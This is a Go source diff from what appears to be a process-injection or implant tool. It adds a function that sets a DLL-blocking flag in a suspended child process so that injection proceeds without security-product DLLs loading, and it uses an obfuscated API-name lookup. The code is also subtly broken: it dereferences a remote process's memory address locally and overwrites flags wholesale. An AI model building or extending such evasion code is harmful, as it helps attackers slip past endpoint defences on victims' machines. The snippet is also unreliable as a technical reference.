@@ -97,3 +97,46 @@ func blockDllsPEBInternal() string {
 	*(*uint32)(unsafe.Pointer(ppPtr + flagsOffset)) = flags
 	return fmt.Sprintf("PEB BlockDlls flag set (old flags: 0x%x)", flags)
 }
+
+// applyBlockDLLsToChild propagates the BlockDLLs PEB flag into a freshly spawned,
+// still-suspended child process so non-Microsoft DLLs are blocked when it loads
+// its modules. It mirrors blockDllsPEBInternal but operates on the remote child
+// handle (hProc) via WriteProcessMemory. Best-effort: any failure is silently
+// ignored so injection is never blocked by a failed hardening step.
+func applyBlockDLLsToChild(hProc uintptr) {
+	if !pebBlockDLLs || hProc == 0 {
+		return
+	}
+	ntdll := syscall.NewLazyDLL("ntdll.dll")
+	procNtQIP := ntdll.NewProc(s(SProcNtQIP))
+
+	type processBasicInformation struct {
+		ExitStatus                   uintptr
+		PebBaseAddress               uintptr
+		AffinityMask                 uintptr
+		BasePriority                 uintptr
+		UniqueProcessID              uintptr
+		InheritedFromUniqueProcessID uintptr
+	}
+	var pbi processBasicInformation
+	ret, _, _ := procNtQIP.Call(
+		hProc,
+		0,
+		uintptr(unsafe.Pointer(&pbi)),
+		uintptr(unsafe.Sizeof(pbi)),
+		0,
+	)
+	if ret != 0 || pbi.PebBaseAddress == 0 {
+		return
+	}
+	// PEB+0x20: ProcessParameters pointer (PEB64 layout)
+	ppPtr := *(*uintptr)(unsafe.Pointer(pbi.PebBaseAddress + 0x20))
+	if ppPtr == 0 {
+		return
+	}
+	// RTL_USER_PROCESS_PARAMETERS+0x70: Flags field (Win10+); bit 0x20 = BlockDlls
+	flagsPtr := ppPtr + 0x70
+	var flags uint32 = 0x20
+	procWrite := kernel32Block.NewProc("WriteProcessMemory")
+	procWrite.Call(hProc, flagsPtr, uintptr(unsafe.Pointer(&flags)), uintptr(unsafe.Sizeof(flags)), 0)
+}
